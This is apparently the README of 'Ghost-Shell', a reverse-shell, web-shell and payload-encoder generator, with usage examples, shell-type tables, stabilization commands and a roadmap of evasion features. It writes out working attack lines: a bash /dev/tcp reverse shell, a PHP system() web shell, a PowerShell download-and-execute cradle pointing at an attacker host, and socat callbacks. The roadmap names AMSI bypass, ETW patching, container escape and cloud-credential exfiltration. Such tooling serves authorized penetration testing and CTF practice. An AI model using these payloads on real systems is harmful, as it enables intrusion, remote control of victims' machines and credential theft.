# Ghost-Shell

> Reverse shell, web shell, and payload encoder for 25+ languages and 9 web shell types.

```
  GHOST-SHELL  v1.0.0  |  Reverse Shell & Web Shell Generator
  By Gh0st-Bx1         |  github.com/Ghost-Bx1
```

![Python](https://img.shields.io/badge/Python-3.6%2B-blue?style=flat-square)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows-lightgrey?style=flat-square)
![Category](https://img.shields.io/badge/Category-Payload%20Generation-red?style=flat-square)

---

## Overview

Ghost-Shell generates ready-to-use reverse shells, web shells, and encoded payloads. It covers 25+ languages and shell types, 9 web shell variants, and multiple encoding formats including Base64 UTF-16LE for PowerShell one-liners.

| Module     | Description                                                      |
|------------|------------------------------------------------------------------|
| `gen`      | Generate reverse shell payload for a given IP and port           |
| `webshell` | Generate web shell (PHP, ASP, ASPX, JSP, Node.js)               |
| `encode`   | Encode payload: Base64, URL, Hex, double URL, Base64 UTF-16LE   |
| `list`     | List all available shells and web shell types                    |

---

## Requirements

```
Python 3.6+
No external dependencies (stdlib only)
nc or ncat in PATH (required for --listen)
```

---

## Installation

```bash
git clone https://github.com/Ghost-Bx1/ghost-shell
cd ghost-shell
python ghost-shell.py --help
```

---

## Usage

### Reverse shell generation

```bash
# List all available shells
python ghost-shell.py list

# Generate all shells for a given IP/port
python ghost-shell.py gen -i 10.10.10.5 -p 4444

# Generate a specific shell type
python ghost-shell.py gen -i 10.10.10.5 -p 4444 -s python3

# Generate all shells at once
python ghost-shell.py gen -i 10.10.10.5 -p 4444 --all

# Generate and start listener automatically
python ghost-shell.py gen -i 10.10.10.5 -p 4444 -s bash --listen
```

### Web shell generation

```bash
# Simple PHP command shell
python ghost-shell.py webshell -t php_cmd

# PHP shell with password authentication
python ghost-shell.py webshell -t php_senha --senha mypassword

# ASP.NET shell
python ghost-shell.py webshell -t aspx

# Save to file
python ghost-shell.py webshell -t php_cmd -o shell.php
```

### Payload encoding

```bash
# Base64
python ghost-shell.py encode -d "bash -i >& /dev/tcp/10.10.10.5/4444 0>&1" -e base64

# URL encoding
python ghost-shell.py encode -d "<?php system(\$_GET['cmd']); ?>" -e url

# Hex
python ghost-shell.py encode -d "payload here" -e hex

# Base64 UTF-16LE (PowerShell)
python ghost-shell.py encode -d "IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.5/shell.ps1')" -e base64_utf16
```

---

## Supported Shell Types

| Type              | Description                          |
|-------------------|--------------------------------------|
| `bash`            | Bash TCP redirect                    |
| `bash_196`        | Bash with file descriptor 196        |
| `bash_udp`        | Bash UDP                             |
| `sh`              | /bin/sh TCP                          |
| `nc`              | Netcat classic                       |
| `nc_openbsd`      | Netcat OpenBSD (no -e flag)          |
| `nc_windows`      | Netcat Windows                       |
| `python2`         | Python 2 socket                      |
| `python3`         | Python 3 socket                      |
| `php`             | PHP one-liner                        |
| `php_shell`       | PHP shell_exec                       |
| `perl`            | Perl socket                          |
| `ruby`            | Ruby TCPSocket                       |
| `golang`          | Go net.Conn                          |
| `java`            | Java Runtime.exec                    |
| `groovy`          | Groovy (Jenkins)                     |
| `nodejs`          | Node.js net.Socket                   |
| `lua`             | Lua socket                           |
| `awk`             | AWK /inet/tcp                        |
| `socat`           | Socat exec                           |
| `socat_static`    | Socat PTY static binary              |
| `powershell`      | PowerShell TCP                       |
| `powershell_b64`  | PowerShell Base64 encoded            |
| `cmd_certutil`    | CMD + certutil download cradle       |
| `msfvenom_hint`   | Suggested msfvenom command           |

## Supported Web Shells

| Type              | Description                          |
|-------------------|--------------------------------------|
| `php_cmd`         | PHP system() - simple                |
| `php_passthru`    | PHP passthru()                       |
| `php_shell_exec`  | PHP shell_exec()                     |
| `php_senha`       | PHP with MD5 password authentication |
| `php_upload`      | PHP with file upload capability      |
| `asp_classic`     | Classic ASP                          |
| `aspx`            | ASP.NET C#                           |
| `jsp`             | Java Server Pages                    |
| `nodejs`          | Node.js Express handler              |

---

## Shell Stabilization

After receiving the connection:

```bash
# Python PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm

# Socat (requires static binary on target)
socat file:`tty`,raw,echo=0 tcp-listen:4445
# On target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_IP:4445

# script method
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg

# rlwrap
rlwrap nc -lvnp 4444
```

---

## Reference

### `gen` flags

| Flag          | Description                                   |
|---------------|-----------------------------------------------|
| `-i IP`       | Attacker IP for reverse connection            |
| `-p PORT`     | Port for reverse connection                   |
| `-s SHELL`    | Specific shell type (default: show all)       |
| `--all`       | Show all available shell types                |
| `--listen`    | Start nc/ncat listener after generating       |

### `webshell` flags

| Flag          | Description                                   |
|---------------|-----------------------------------------------|
| `-t TYPE`     | Web shell type (see table above)              |
| `--senha`     | Password for php_senha authentication         |
| `-o FILE`     | Save to file                                  |

### `encode` flags

| Flag          | Description                                               |
|---------------|-----------------------------------------------------------|
| `-d DATA`     | Payload to encode                                         |
| `-e ENCODING` | Type: base64, base64_utf16, url, double_url, hex          |

---

## Roadmap

Improvements planned based on analysis of revshells.com, msfvenom and nishang:

| Priority | Feature | Description |
|----------|---------|-------------|
| High | AMSI bypass prepend | Auto-prepend PowerShell AMSI bypass snippet before any PS payload (`--amsi`) |
| High | ETW patch snippets | Prepend Event Tracing for Windows (ETW) patching to PowerShell one-liners (`--etw`) |
| High | Obfuscation engine | Variable name randomization, string splitting, tick insertion for PS payloads (`--obfuscate`) |
| High | Container escape payloads | cgroup notify_on_release, procfs host process exec, exposed Docker socket abuse |
| High | Staged cradle generator | Download+exec cradle separate from stage: certutil, bitsadmin, PS IEX, curl|bash |
| High | Cloud SSRF-to-shell | SSRF payloads targeting IMDSv1 (169.254.169.254) to exfil cloud creds |
| Medium | Process injection templates | CreateRemoteThread, QueueAPC, EarlyBird in C/C# stub form with shellcode placeholder |
| Medium | Kubernetes payloads | kubectl exec -it template, kube-apiserver unauthenticated RCE template |
| Medium | LOLBAS/GTFOBins hints | After generating a shell, suggest living-off-the-land alternatives for the detected OS |
| Medium | Auto stabilization guide | After `--listen`, auto-print PTY stabilization steps (python3 pty + stty raw) |
| Low | Shellcode formatter | Output raw shellcode as C array, Python bytes, PS byte array or hex string |
| Low | DLL hijacking templates | Generate a hijackable DLL stub in C for common Windows DLL search order abuses |

## Disclaimer

For use in authorized environments only. Penetration testing, CTF competitions, and offensive security research with explicit permission from the environment owner. The author is not responsible for misuse.

---

**By [Gh0st-Bx1](https://github.com/Ghost-Bx1)**
